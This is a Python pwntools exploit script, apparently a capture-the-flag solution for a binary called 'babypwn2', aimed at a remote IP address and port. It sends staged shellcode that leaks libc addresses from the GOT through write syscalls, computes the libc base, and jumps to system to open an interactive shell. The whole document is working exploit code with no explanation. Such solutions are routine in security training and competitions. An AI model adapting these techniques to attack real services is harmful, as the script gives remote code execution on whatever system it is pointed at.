from pwn import *

# p = process("./babypwn2")
p = remote("128.199.247.163", 19957)
# libc = ELF("./libc.so")
libc = ELF("./libc6-server.so")
context.arch = 'amd64'

log.info("Payload 1: Get 10 more bytes to write")
payload = ""
payload += asm("lea rax, [rdx+9]")
payload += asm("push 0x400739")
payload += asm("ret")

print len(payload)

pause()

p.send(payload)

log.info("Payload 2: Prepare rdx=0xff")
payload = ""
payload += asm("lea rax, [rdx+18]")
payload += asm("xor rdx, rdx")
payload += asm("dec dl")
payload += asm("ret")

print len(payload)
pause()

p.send(payload)

log.info("Payload 3: Change return addr to skip setting rdx")
payload = ""
payload += asm("push 0x40073e")
payload += asm("ret")

print len(payload)
pause()

p.send(payload)

log.info("Payload 4: Leak libc addreses")

puts_libc_got = 0x601018
mmap_libc_got = 0x601020

payload = ""
payload += asm("mov r8, rax")
payload += asm("xor rdi, rdi")
payload += asm("inc rdi")
payload += asm("mov rsi, " + hex(puts_libc_got))
payload += asm("mov rdx, 8")
payload += asm("xor rax, rax")
payload += asm("inc rax")
payload += asm("syscall")

payload += asm("xor rdi, rdi")
payload += asm("inc rdi")
payload += asm("mov rsi, " + hex(mmap_libc_got))
payload += asm("mov rdx, 8")
payload += asm("xor rax, rax")
payload += asm("inc rax")
payload += asm("syscall")

payload += asm("mov rsi, r8")
payload += asm("sub rsi, 18")
payload += asm("mov rdx, 0x100")
payload += asm("push 0x400741")
payload += asm("ret")

print len(payload)
pause()

p.sendline(payload)

p.recvuntil("10 bytes:\n")
puts_libc = u64(p.recv(8))
mmap_libc = u64(p.recv(8))

log.info("puts@libc: " + hex(puts_libc))
log.info("mmap@libc: " + hex(mmap_libc))

libc_base = puts_libc - libc.symbols["puts"]
log.info("libc base: " + hex(libc_base))

log.info("Payload 5: one_gadget")
one_gadget = libc_base + 0x4f322 # 0x47c46
log.info("one_gadget: " + hex(one_gadget))

payload = ""
payload += asm("mov rax, " + hex(libc_base + libc.symbols["system"]))
payload += asm("push rax")
payload += asm("mov rdi, " + hex(libc_base + 0x1b3e9a))
payload += asm("ret")

pause()
p.sendline(payload)

p.interactive()
